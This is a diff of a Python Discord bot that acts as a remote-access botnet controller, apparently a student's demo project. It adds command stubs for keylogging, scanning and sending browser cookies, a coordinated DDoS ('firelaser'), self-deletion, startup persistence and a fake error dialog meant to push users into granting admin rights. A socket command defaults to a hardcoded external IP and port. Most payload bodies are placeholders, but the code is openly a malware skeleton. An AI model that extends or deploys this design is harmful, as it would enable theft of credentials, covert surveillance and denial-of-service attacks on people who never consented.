@@ -7,6 +7,7 @@ initiate more complex functionality. Depending how deep i go down this rabbit ho
 startup file to make it persistent through restarts. may also implement a botnet ddos command which will be illegal to
 test so probably wont end up doing that unless im interested in crashing my own internet.
 """
+#Written and designed by Stone Preheim
 from discord.ext import commands
 from Client import Client
 import sys
@@ -21,14 +22,26 @@ bot = commands.Bot(command_prefix='!')
 #create way for bot to identify itself off username and random int(posibility of duplicate usernames)
 botID = getpass.getuser() + str(random.randint(0, 10))
 activated = False
-#variable to flag to socket threads to close, may not use.
-threadsExit = False
+#variable to flag to close dos threads and logger.
+closeDDOS = True
+closeLogger = True
 controllerVersion = "V1.0"
 
+#May not implement this in the end as there is no reasonable reason to do this for demo purposes.
+#Might do it anyways because it'd be cool.
+def addProcToStartup():
+    print()
+
+#might make a fake UI error to enqourage user to "Run with admin privleges" although it isnt required for most functionality
+def showFakeUIerror():
+    print()
+
+#get a list of connected client usernames
 @bot.command("ping")
 async def ping(ctx):
     await ctx.send(str(botID))
 
+#version control command
 @bot.command("ver")
 async def ver(ctx):
     global activated
@@ -58,6 +71,12 @@ async def deactivate(ctx, ID = ""):
         activated = False
         await ctx.send("controller " + str(botID) + " deactivated and will respond to ping only")
 
+#deactivates all bots
+@bot.command("drop")
+async def drop(ctx):
+    global activated
+    activated = False
+
 #command for directing controller to open new socket connection
 @bot.command("servsoc")
 async def servsoc(ctx, IP="23.123.182.6", PORT=7771):
@@ -71,17 +90,45 @@ async def servsoc(ctx, IP="23.123.182.6", PORT=7771):
 async def startlog(ctx):
     global activated
     if activated:
-        print()
+        await ctx.send(f"{botID} has started listening...")
+
 #command to stop keylogging
 @bot.command("stoplog")
 async def stoplog(ctx):
     global activated
     if activated:
-        print()
-#version control command
+        await ctx.send(f"{botID} has stopped listening...")
+
+#command to scan common cookie directories and send them
+@bot.command("getcookies")
+async def getCookies(ctx):
+    global activated
+    if activated:
+        await ctx.send(f"Enjoy your cookies boss!")
+
+#command to start entire botnet ddos at target
+@bot.command("firelaser")
+async def fireLaser(ctx, TARGET, TPORT):
+    """This could be a really dangerous thing to show the class,
+    but so is this entire project haha.
+    Please let me know if you dont want me to implement this,
+    or at least not show it to the class."""
+    await ctx.send(f"{botID} has started attack on {TARGET}:{TPORT}")
+
+#command to stop entire botnet ddos at target
+@bot.command("ceasefire")
+async def ceaseFire(ctx):
+    await ctx.send(f"{botID} has stopped attack on {TARGET}:{TPORT}")
+
+#command to have application delete itself.
+@bot.command("vanish")
+async def vanish(ctx):
+    await ctx.send(f"{botID} could not erase itself.")
+
 def start():
     bot.run(TOKEN)
 
 if __name__ == '__main__':
+    addProcToStartup()
     start()
 
